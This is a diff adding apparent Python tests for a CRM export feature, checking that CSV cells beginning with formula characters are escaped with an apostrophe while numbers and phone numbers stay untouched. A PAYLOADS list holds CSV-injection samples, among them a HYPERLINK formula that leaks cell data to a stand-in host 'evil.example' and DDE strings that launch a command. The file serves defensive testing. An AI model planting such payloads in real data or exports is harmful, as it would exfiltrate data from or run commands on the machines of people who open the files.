@@ -132,3 +132,83 @@ async def test_the_download_is_named_and_attached(client):
     r = await client.get("/api/contacts/export", headers=auth(token))
     disposition = r.headers.get("content-disposition", "")
     assert "attachment" in disposition and "contacts.csv" in disposition
+
+
+# ---- formulas ----------------------------------------------------------------------------------
+#
+# Excel, Sheets and LibreOffice evaluate a cell that starts with `=`, `+`, `-` or `@` (and Excel one
+# that starts with a tab or carriage return) as a formula. Account names, titles and industries come
+# from imports, CRM pulls and web enrichment, so a value like `=HYPERLINK(...)` or `+cmd|...` is
+# attacker-influenced, and opening the export would run it.
+
+PAYLOADS = [
+    '=HYPERLINK("http://evil.example/?d="&A2,"Click")',
+    "+cmd|' /C calc'!A0",
+    "-2+3+cmd|' /C calc'!A0",
+    "@SUM(1+1)*cmd|' /C calc'!A0",
+    "\t=1+1",
+    "\r=1+1",
+]
+
+
+def _cells(*values) -> list[str]:
+    from nexus.api.csv_export import csv_response
+
+    body = csv_response("x.csv", [f"c{i}" for i in range(len(values))], [list(values)]).body.decode()
+    return parse(body)[1][0]
+
+
+def test_a_cell_a_spreadsheet_would_run_is_written_as_text():
+    """A leading apostrophe makes the spreadsheet show the value instead of running it."""
+    for payload, cell in zip(PAYLOADS, _cells(*PAYLOADS)):
+        assert cell == "'" + payload, (payload, cell)
+
+
+def test_a_list_cell_is_neutralised_after_joining():
+    assert _cells(["=1+1", "Salesforce"]) == ["'=1+1; Salesforce"]
+
+
+def test_ordinary_text_and_formula_characters_later_in_a_value_are_untouched():
+    assert _cells("Acme", "VP Sales", "a=b", "R&D - EMEA", "") == [
+        "Acme", "VP Sales", "a=b", "R&D - EMEA", ""]
+
+
+def test_numbers_stay_numbers():
+    """A real number, negative included, is data a spreadsheet must still be able to sum."""
+    from decimal import Decimal
+
+    assert _cells(-5, 120, 3.5, Decimal("-12.50"), True) == ["-5", "120", "3.5", "-12.50", "True"]
+
+
+def test_a_phone_number_is_not_mangled():
+    """Phones are stored E.164, so every one starts with `+`. Digits and phone punctuation cannot
+    call a function or reach a link, and an apostrophe on every number would break a CRM
+    re-import of the file."""
+    assert _cells("+14155552671", "+1 (415) 555-2671", "-42", "+44 20 7946 0958") == [
+        "+14155552671", "+1 (415) 555-2671", "-42", "+44 20 7946 0958"]
+
+
+async def test_the_accounts_export_neutralises_a_malicious_name_and_industry(client):
+    token = await signup(client, slug="csv9", email="o@csv9.com", company="CSV9")
+    await _account(client, token, PAYLOADS[0], domain="evil.example", industry=PAYLOADS[1])
+    r = await client.get("/api/accounts/export/csv", headers=auth(token))
+    header, rows = parse(r.text)
+    row = next(x for x in rows if x[header.index("domain")] == "evil.example")
+    assert row[header.index("name")] == "'" + PAYLOADS[0]
+    assert row[header.index("industry")] == "'" + PAYLOADS[1]
+
+
+async def test_the_contacts_export_neutralises_a_malicious_name_and_title(client):
+    token = await signup(client, slug="csv10", email="o@csv10.com", company="CSV10")
+    acc = await _account(client, token, "Acme", domain="acme.example")
+    r = await client.post(f"/api/accounts/{acc['id']}/contacts", headers=auth(token),
+                          json={"full_name": "=1+1", "title": PAYLOADS[3],
+                                "phone": "+1 415 555 2671"})
+    assert r.status_code in (200, 201), r.text
+
+    r = await client.get("/api/contacts/export", headers=auth(token))
+    header, rows = parse(r.text)
+    row = next(x for x in rows if x[header.index("domain")] == "acme.example")
+    assert row[header.index("full_name")] == "'=1+1"
+    assert row[header.index("title")] == "'" + PAYLOADS[3]
+    assert row[header.index("phone")].startswith("+") and "'" not in row[header.index("phone")]
